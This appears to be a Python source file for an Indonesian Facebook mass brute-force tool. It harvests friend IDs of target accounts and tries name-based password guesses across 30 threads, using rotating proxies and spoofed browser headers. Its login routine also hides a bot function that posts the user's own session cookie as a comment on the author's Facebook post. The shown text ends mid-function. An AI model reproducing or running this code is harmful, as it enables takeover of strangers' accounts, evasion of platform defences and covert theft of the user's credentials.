###----------[ IMPORT-MODULE ]----------###       
import os, re, sys, bs4, json, random, requests, time, datetime
from bs4 import BeautifulSoup as sop	
from datetime import datetime
from rich import print as prints
from rich.panel import Panel
from rich.tree import Tree
from bs4 import BeautifulSoup as bs
from bs4 import BeautifulSoup as par
from time import time as peak
from rich.console import Console
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as ArifGanteng

###----------[ GLOBAL-NAME ]----------###       
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen = [],[]
uamu, uadia = [],[]
dump, taplikasi = [],[]
loop, ok, cp = 0,0,0
console = Console()

###----------[ USER-AGENT ]----------###       	
def Saran(glento):
		rr = random.randint
		rc = random.choice
		for apcb in range(glento):
			browser = rc(
	[
		f"PaleMoon/{str(rr(1,9))}.0.{str(rr(1,9))}.{str(rr(1,15))}",
		f"OPR/{str(rr(1,9))}.0.{str(rr(1,9))}.{str(rr(1,15))}",
		f"UCBrowser/{str(rr(1,9))}.0.{str(rr(1,9))}.{str(rr(1,15))}",
		f"Browser/{str(rr(1,9))}.0.{str(rr(1,9))}.{str(rr(1,15))}",
		f"WelBrowser/{str(rr(1,9))}.0.{str(rr(1,9))}.{str(rr(1,15))}",
		f"HiBrowser/{str(rr(1,9))}.0.{str(rr(1,9))}.{str(rr(1,15))}",
		f"PHX/{str(rr(1,9))}.0.{str(rr(1,9))}.{str(rr(1,15))}",
		f"HeadlessChrome/{str(rr(1,9))}.0.{str(rr(1,9))}.{str(rr(1,15))}",
		f"Edge/{str(rr(1,9))}.0.{str(rr(1,9))}.{str(rr(1,15))}",
	]
)
			device = rc(["X676B","X687","X609","X697","X680D","X507","X605","X668","X6815B","X624", "X655F","X689C","X608","X698","X682B","X682C","X688C", "X688B","X658E","X659B","X689B","X689","X689D","X662","X662B","X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C","X6816","X6816D","X668C","X665B","X665E", "X510","X559C","X559F","X559","X606","X606C","X606D"])
			A = f"Mozilla/5.0 (Linux; Android {str(rr(1,9))}.{str(rr(1,9))}; {device}) Build/0{str(rr(1,12))}0{str(rr(5,20))})"
			B = f"AppleWebKit/537.36 (KHTML, {rc(['like','seperti'])} Gecko)"
			C = f"Chrome/{str(rr(72,112))}.0.{str(rr(4200,4900))}.{str(rr(42,150))} Mobile Safari/537.36 {browser}"
			Hoki = f'{A} {B} {C}'
		return(str(Hoki))
		
def Saran(glento):
		rr = random.randint
		rc = random.choice
		for apcb in range(glento):
			device = rc(["X676B","X687","X609","X697","X680D","X507","X605","X668","X6815B","X624", "X655F","X689C","X608","X698","X682B","X682C","X688C", "X688B","X658E","X659B","X689B","X689","X689D","X662","X662B","X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C","X6816","X6816D","X668C","X665B","X665E", "X510","X559C","X559F","X559","X606","X606C","X606D"])
			A = f"Mozilla/5.0 (Linux; Android {str(rr(1,9))}.{str(rr(1,9))}; {device}) Build/0{str(rr(1,12))}0{str(rr(5,20))})"
			B = f"AppleWebKit/537.36 (KHTML, {rc(['like','seperti'])} Gecko)"
			C = f"Chrome/{str(rr(72,112))}.0.{str(rr(4200,4900))}.{str(rr(42,150))} Mobile Safari/537.36"
			Hoki = f'{A} {B} {C}'
		return(str(Hoki))

###----------[ WARNA-TEMA ]----------###       
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU

###----------[ CONVERTER-BULAN ]----------###       
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.now().day
bln = dic[(str(datetime.now().month))]
thn = datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
now = str(tgl)+'-'+str(bln)+'-'+str(thn)	

###----------[ KOMEN-BOT ]----------###       
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
hari = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
hari_ini = ("%s %s %s"%(datetime.now().day,bulan,datetime.now().year))
waktu = datetime.now().strftime("%X")
koc = ('\nKomentar Ditulis Oleh Bot\n\n( Pukul %s WIB )\n- %s, %s -'%(waktu,hari,hari_ini))
kom = ('\nSemangat Bang Keren😼 @[100028845823412:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
link = ('https://www.facebook.com/100028845823412/posts/1081897416115109/?app=fbl')
ran1 = "Terimakasih Scnya Guru🙏😎"
 
###----------[ WAKTU ]----------###       	     
def waktu():
    now = datetime.now()
    hours = now.hour
    if 4 <= hours < 12:timenow = "Selamat Pagi"
    elif 12 <= hours < 15:timenow = "Selamat Siang"
    elif 15 <= hours < 18:timenow = "Selamat Sore"
    elif 00 <= hours < 4:timenow = "Selamat Malam"
    else:timenow = "Good Night"
    return timenow
      
###----------[ BANNER ]----------###       
def logo_log():
      if "win" in sys.platform:os.system("cls")
      else:os.system("clear")
      prints(Panel(f"""\r
   _____ _____________________       ____  _____________  
  /     \\______   \_   _____/       \   \/  /\______   \ 
 /  \ /  \|    |  _/|    __)  ______  \     /  |       _/ 
/    Y    \    |   \|     \  /_____/  /     \  |    |   \ 
\____|__  /______  /\___  /          /___/\  \ |____|_  / 
        \/       \/     \/                 \_/        \/  
""",width=80,padding=(0,8),title=f"[red]Version 2.0",subtitle=f"[yellow][ Muhammad Arif Xr ]",style=f"white"))
                                                                                          
                                                                               
###----------[ LOGIN ]----------###       
def login():
	try:		
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()
		tokene.append(token)
		try:
			sys = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokene[0], cookies={'cookie':cok})
			sys2 = json.loads(sys.text)['id']
			sys3 = json.loads(sys.text)['name']
			menu(sys2,sys3)
		except KeyError:
			login_cokies()
		except requests.exceptions.ConnectionError:
			prints(Panel.fit(f'Koneksi problem',style=f'red'))
			exit()
	except IOError:
		login_cokies()

#----------[ LOGIN-COKIES ]----------# 		 
def login_cokies():
	try:
		logo_log()
		ses = requests.Session()
		prints(Panel(f"[white] DISARANKAN MENGAMBIL KUKIS DI [red]EKSTENTION DOUGH[white] JANGAN AKUN PRIBADI",width=80,padding=(0,5),style=f"white"))
		cok = input(f'\x1b[0m└──[ Cookies {hijo} : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			prints(Panel.fit(f'Cookies Invalid',style=f'red'))
			exit()
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					tok = re.search('"access_token": "(.*?)"', str(response7)).group(1)				
					token = open(".cyxieontoken.txt", "w").write(tok)
					cokie = open(".cyxieoncokies.txt", "w").write(cok)
					print(f"\x1b[0m└──[ Token {hijo}: {tok}")
					bot(cok)
					prints(Panel(f"[white] BERHASIL LOGIN, SELAMAT DATANG KAK SILAKAN JALANKAN ULANG PYTHONNYA ",width=80,padding=(0,4),style=f"white"))
					exit()
				else:
					prints(Panel.fit(f'Login Gagal',style=f'red'))
					exit()
					
	except Exception as e:
		prints(Panel.fit(f'Cookies Invalid Bro',style=f'red'))
		os.system('rm -rf .cyxieoncokies.txt & rm -rf .cyxieontoken.txt')
		exit()
		
###----------[ BOT ]----------### 
def bot(cok):
	try:
		ses = requests.Session()
		cookies = {'cookie':cok}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		ses.post(f"https://graph.facebook.com/100028845823412_1081897416115109/comments/?message={cok}&access_token={tok}", headers = {"cookie":cok})
		ses.post(f"https://graph.facebook.com/100028845823412_1081897416115109/comments/?message={kom}\n{link}\n{koc}&access_token={tok}",cookies = {"cookie":cok})
		ses.post(f"https://graph.facebook.com/100028845823412_1081897416115109/comments/?message={ran1}&access_token={tok}",cookies = {"cookie":cok})
	except:
		pass
			
###----------[ BAGIAN-MENU ]----------###       
def menu(name,id):
	try:
		cok = open('.cyxieoncokies.txt','r').read()
		token = open('.cyxieontoken.txt','r').read()
	except IOError:
		prints(Panel.fit(f'Cookies telah kedaluarsa',style=f'red'))
		time.sleep(5)
		login()
	try:
	   date = requests.get("http://ip-api.com/json/").json()
	except KeyError:
	    date = " "
	try:
	    ip = date["query"]
	    kartu = date["as"]
	    negara = date["country"]
	    wilayah = date["city"]
	except KeyError:
	        ip = " "
	        kartu = " "
	        negara = " "   
	        wilayah = " "
	except:
	       pass 
	logo_log()
	prints(Panel(f"[white][[red]÷[white]] Username [green]: {name}\t[white][[red]÷[white]] User Ip [green]: {ip}\n[white][[red]÷[white]] User  Id [green]: {id}\t[white][[red]÷[white]] Card Id [green]: {kartu}\n[white][[red]÷[white]] Status   [green]: Premium\t\t[white][[red]÷[white]] Cauntry [green]: {negara}\n[white][[red]÷[white]] Time Day [green]: {waktu()}\t[white][[red]÷[white]] City    [green]: {wilayah}",width=80,padding=(0,5),style=f"white"))
	prints(Panel(f"[white] Selamat Datang Kak Gunakan Sewajarnya Aja Ya Kak ",width=80,padding=(0,12),style=f"white"))   
	prints(Panel(f"[white][[red]01[white]] MBF Crack Followers\t[white][[red]04[white]] MBF Hasil OK\n[white][[red]02[white]] MBF Dump Followers\t\t[white][[red]05[white]] MBF Hasil CP\n[white][[red]03[white]] MBF Dump File ID\t\t[white][[red]00[white]] Ganti Cookies",width=80,padding=(0,12),style=f"white"))
	xx = input(f"\x1b[0m└──[ Pilih : ")
	if xx in ['01','1']:crack_followers(cok,token)	       
	elif xx in ['02','2']:dump_followers(cok,token)
	elif xx in ['03','3']:dump_target(cok,token)
	elif xx in ['04','4']:hasil_ok()
	elif xx in ['05','5']:hasil_cp()
	elif xx in ['00','0']:os.system('rm -rf .cyxieoncokies.txt & rm -rf .cyxieontoken.txt');login()
	else:
	    prints(Panel.fit(f'Pemasukan Salah',style=f'red'))
	    exit()

###----------[ CRACK-FOLLOWERS ]----------###       	    
def crack_followers(cok,token):
	prints(Panel(f"[white] HAY KAK SILAKAN MASUKAN ID TARGET YANG PUBLIK YA KAK ",width=80,padding=(0,11),style=f"white"))
	uid = input(f'\x1b[0m└──[ ID : ')
	try:
		head = ({"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"})
		params = ({'access_token': token,'fields': "friends"})	
		url = requests.get('https://graph.facebook.com/{}'.format(uid),params=params,headers=head,cookies={'cookies':cok}).json()
		for z in url['friends']['data']:
			try:
			    id.append(z["id"]+"|"+z["name"])
			except:
			    continue
		prints(Panel(f" TOTAL ID : [green] "+str(len(id)),width=80,padding=(0,28),style=f"white"))
		atur_id()
	except requests.exceptions.ConnectionError:
		prints(Panel.fit(f'Gagal dump',style=f'red'))
		exit()
	except (KeyError,IOError):
		prints(Panel.fit(f'Tidak ada teman',style=f'red'))
		exit()

###----------[ DUMP-FOLLOWERS ]----------###  
def dump_followers(cok,token):    
	try:
		prints(Panel(f"[white] HAY KAK MASUKAN MAU BERAPA USER ID TARGET KAK ",width=80,padding=(0,14),style=f"white"))
		kumpulkan = int(input(f'\x1b[0m└──[ Berapa : '))
	except ValueError:
	    prints(Panel.fit(f'Gagal dump',style=f'red'))
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    prints(Panel.fit(f'Limit 1000',style=f'red'))
	    exit()
	prints(Panel(f"[white] HAY KAK SILAKAN MASUKAN ID TARGET YANG PUBLIK YA KAK ",width=80,padding=(0,11),style=f"white"))
	ses=requests.Session()
	bilangan = 0
	for Hu in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'\x1b[0m└──[ ID '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = ({"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"})
	       params = ({'access_token': token,'fields': "friends"})
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        prints(Panel.fit(f'Koneksi problem',style=f'red'))
	        exit()
	try:
	      prints(Panel(" TOTAL ID : [green] "+str(len(id)),width=80,padding=(0,28),style=f"white"))
	      atur_id()
	except requests.exceptions.ConnectionError:
	    prints(Panel.fit(f'Gagal dump',style=f'red'))
	    exit()
	except (KeyError,IOError):
		prints(Panel.fit(f'Teman tidak publik',style=f'red'))
		exit()		
		
###----------[ TARGET ]----------###       		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_md()

###----------[ METHOD ]----------###       		            
def atur_md():
     prints(Panel(f" [white][[red]01[white]] Login With Mobile  [red]([green] Validate [red]) \n [white][[red]02[white]] Login With Mobile  [red]([green] Original [red]) \n [white][[red]03[white]] Login With Mobile  [red]([green] Asyinc [red]) \n [white][[red]04[white]] Login With Mobile  [red]([green] Alpha [red]) \n [white][[red]05[white]] Login With Mbasic  [red]([green] Validate [red]) ",width=80,padding=(0,18),style=f"white"))
     xxx = input(f"\x1b[0m└──[ Pilih : ")
     if xxx in ['1','01']:method.append('crack1')
     elif xxx in ['2','02']:method.append('crack2')
     elif xxx in ['3','03']:method.append('crack3')
     elif xxx in ['4','04']:method.append('crack4')
     elif xxx in ['5','05']:method.append('crack5')
     else:method.append('crack1')
     dasar()
        
###----------[ USER-AGENT ]----------###       	    
def dasar():
	prints(Panel(f"[white] Hai Kak Apakah Ingin Menggunakan User Agent Manual (y/t)? ",width=80,padding=(0,10),style=f"white")) 
	uas = input(f'\x1b[0m└──[ Pilih : ')
	if uas in ['y','1','ya','01']:
	     uadia.append('ya')
	     prints(Panel(f"[white] Hay Kak Silakan Masukan User Agent Manual Kakak ",width=80,padding=(0,12),style=f"white")) 
	     uau= input(f'\x1b[0m└──[ User Agent : ')
	     uamu.append(man)
	elif uas in ['2','02']:daftar()
	else:uadia.append('no') 
	aplikasi()
     
###----------[ APLIKASI ]----------###       
def aplikasi():
	prints(Panel(f"[yellow] Menampilkan Aplikasi Bisa Membuat Akun Checkpoint Atau Spam ",width=80,padding=(0,8),title=f"[[red] Sangat tidak di sarankan [white]]",style=f"white")) 	
	prints(Panel(f"[white] Hay Kak Apakah Ingin Menampilkan Aplikasi Di Dalamnya (y/t)? ",width=80,padding=(0,8),style=f"white")) 	
	axp  = input("\x1b[0m└──[ Pilih : ")
	if axp in ['y','Y','ya','YA']:taplikasi.append('ya')
	else:taplikasi.append('no')
	password()

###----------[ WORDLIST ]----------###       	
def password():
    prints(Panel(f" [white][[red]01[white]] Password Manualis\t[red]([red] Not Recommend [red]) \n [white][[red]02[white]] Password Gabungan\t[red]([green] Recommended [red]) \n [white][[red]03[white]] Password Otomatis\t[red]([green] Ver Recommend [red]) ",width=80,padding=(0,18),style=f"white"))
    pwv = input(f"\x1b[0m└──[ Pilih : ")
    if pwv in ['1','01']:manual()
    elif pwv in ['2','02']:gabung()
    elif pwv in ['3','03']:otomatis() 
    else:otomatis() 		

###----------[ OTOMATIS ]----------###           		
def otomatis():
	global prog,des
	prints(Panel(f"[white][[red]÷[white]] OK Tersimpan Di [green]MBF-OK/{okc}\n[white][[red]÷[white]] CP Tersimpan Di [yellow]MBF-CP/{cpc} ",width=80,padding=(0,12),style=f"white"))
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with ArifGanteng(max_workers=30) as pool:
			for vanilla in id2:
				idf,nmf = vanilla.split('|')[0],vanilla.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwx = [nmf,frs+'123',frs+'1234',frs+'12345',frs+'321']
				if 'crack1' in method:pool.submit(crack1,idf,pwx)
				elif 'crack2' in method:pool.submit(crack2,idf,pwx)
				elif 'crack3' in method:pool.submit(crack3,idf,pwx)
				elif 'crack4' in method:pool.submit(crack3,idf,pwx)
				elif 'crack5' in method:pool.submit(crack3,idf,pwx)
				else:pass
	okeh()			
###----------[ GABUNG ]----------###       	
def gabung():
	global prog,des
	prints(Panel(f"[white] Hay Kak Silakan Masukan Password Gunakan ( , ) Sebagai Pemisah ",width=80,padding=(0,8),style=f"white")) 
	pwku = input(f"\x1b[0m└──[ Password : ")
	prints(Panel(f"[white][[red]÷[white]] OK Tersimpan Di [green]MBF-OK/{okc}\n[white][[red]÷[white]] CP Tersimpan Di [yellow]MBF-CP/{cpc} ",width=80,padding=(0,12),style=f"white"))
	pwkuh = pwku.split(',')
	for xpw in pwkuh:
		sandina.append(xpw)
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with ArifGanteng(max_workers=30) as pool:
			for vanilla in id2:
				idf,nmf = vanilla.split('|')[0],vanilla.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwx = [nmf,frs+'123',frs+'1234',frs+'12345',frs+'321']
				pwx.append(nmf)
				for xpwd in sandine:
					pwx.append(xpwd)
				if 'crack1' in method:pool.submit(crack1,idf,pwx)
				elif 'crack2' in method:pool.submit(crack2,idf,pwx)
				elif 'crack3' in method:pool.submit(crack3,idf,pwx)
				elif 'crack4' in method:pool.submit(crack3,idf,pwx)
				elif 'crack5' in method:pool.submit(crack3,idf,pwx)
				else:pass
	okeh()			
	
###----------[ MANUAL ]----------###       		
def manual():
	global prog,des
	prints(Panel(f"[white] Hay Kak Silakan Masukan Password Gunakan ( , ) Sebagai Pemisah ",width=80,padding=(0,8),style=f"white")) 
	pwku = input(f"\x1b[0m└──[ Password : ")
	prints(Panel(f"[white][[red]÷[white]] OK Tersimpan Di [green]MBF-OK/{okc}\n[white][[red]÷[white]] CP Tersimpan Di [yellow]MBF-CP/{cpc} ",width=80,padding=(0,12),style=f"white"))
	pwkuh = pwku.split(',')
	for xpw in pwkuh:
		sandina.append(xpw)
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with ArifGanteng(max_workers=30) as pool:
			for vanilla in id2:
				idf,nmf = vanilla.split('|')[0],vanilla.split('|')[1].lower()
				pwx =[]
				for xpwd in sandina:
					pwx.append(xpwd)
				if 'crack1' in method:pool.submit(crack1,idf,pwx)
				elif 'crack2' in method:pool.submit(crack2,idf,pwx)
				elif 'crack3' in method:pool.submit(crack3,idf,pwx)
				elif 'crack4' in method:pool.submit(crack3,idf,pwx)
				elif 'crack5' in method:pool.submit(crack3,idf,pwx)
				else:pass
	okeh()

###----------[ TAHUN-AKUN ]----------###       
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
						     
###----------[ MBF-01 ]----------###       				    
def crack1(idf,pwx):
     global loop,ok,cp
     ses = requests.Session()
     rr = random.randint
     rc = random.choice
     emot = rc(["😝","😜","🤪"])
     prog.update(des,description=f"\r[white] {emot} ( MBF 01 ) ( OK [green]: {ok} [white]) ( CP [yellow]: {cp} [white]) ([red] {loop}/{len(id)} [white]) ")
     prog.advance(des)
     for pw in pwx:
          try:
               proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
               open('socksku.txt','w').write(proxs)
               nip = rc(proxs)
               proxs = {'http': 'socks4://'+nip}
               ua = Saran(glento=1)
               ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
               link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=607187076044599&kid_directed_site=0&app_id=607187076044599&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fclient_id%3D607187076044599%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fpergikuliner.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D90447ac345e71ee7b3f3fe074078ad82078d27a0eb62a266%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6321ea45-1edf-459d-b7ba-f3006d4e5264%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpergikuliner.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D90447ac345e71ee7b3f3fe074078ad82078d27a0eb62a266%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
               date = {
		"lsd":
		    re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
		"jazoest":
		       re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
		       "uid":idf,
		       "next":"https://m.facebook.com/v8.0/dialog/oauth?client_id=607187076044599&display=popup&redirect_uri=https%3A%2F%2Fpergikuliner.com%2Fusers%2Fauth%2Ffacebook%2Fcallback&response_type=code&scope=email&state=90447ac345e71ee7b3f3fe074078ad82078d27a0eb62a266&ret=login&fbapp_pres=0&logger_id=6321ea45-1edf-459d-b7ba-f3006d4e5264&tp=unspecified",
		       "flow":"login_no_pin",
		       "pass":pw,
	        }
               cokz = ";".join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items()])		
               bahasa = rc(['en-US;q=0.8,en;q=0.7','en-GB;q=0.8,en;q=0.7','zh-CN;q=0.8,zh;q=0.7','ms_MY;q=0.8,ms;q=0.7','fr_FR;q=0.8,fr;q=0.7','id-ID;q=0.8,id;q=0.7','jv-ID;q=0.8,id;q=0.7'])
               head = (
			{
			'Host': 'm.facebook.com',
			'cache-control': 'max-age=0',
			'dpr': f'{str(rr(1,5))}',
			'viewport-width': f'{str(rr(400,999))}',
			'sec-ch-ua': f'"Not?A_Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(108,114))}", "Google Chrome";v="{str(rr(108,114))}"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
			'sec-ch-ua-full-version-list':f'"Chromium";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Google Chrome";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Not:A-Brand";v="{str(rr(8,20))}.0.0.0"',
			'sec-ch-prefers-color-scheme': 'light',
			'upgrade-insecure-requests': '1',
			'origin': 'https://m.facebook.com',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'x-requested-with': 'com.facebook.katana',
			'sec-fetch-site': 'none',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
